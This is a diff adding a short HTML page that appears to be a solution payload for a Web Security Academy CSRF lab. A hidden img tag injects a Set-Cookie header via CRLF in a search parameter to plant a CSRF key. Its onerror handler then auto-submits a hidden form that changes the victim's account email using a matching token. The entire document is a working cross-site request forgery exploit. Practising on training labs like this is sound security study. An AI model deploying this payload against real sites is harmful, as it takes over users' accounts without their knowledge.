@@ -1,0 +1,11 @@
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a04003c032536a1c195276b009e002d.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
+            <input type="hidden" name="email" value="ItachiUchiha82@konoha.org">
+            <input type="hidden" name="csrf" value="XWdviogbKoTKcBxMNqTlrAv9NZ31fBiO">
+        </form>
+        <img style="display:none" src="https://0a04003c032536a1c195276b009e002d.web-security-academy.net/?search=hello%0d%0aSet-Cookie:%20csrfKey=TSkHhPzgwhNU9t4Nmmt8HHo9nMflJqac" onerror='document.getElementById("csrf-form").submit()'>
+    </body>
+</html>
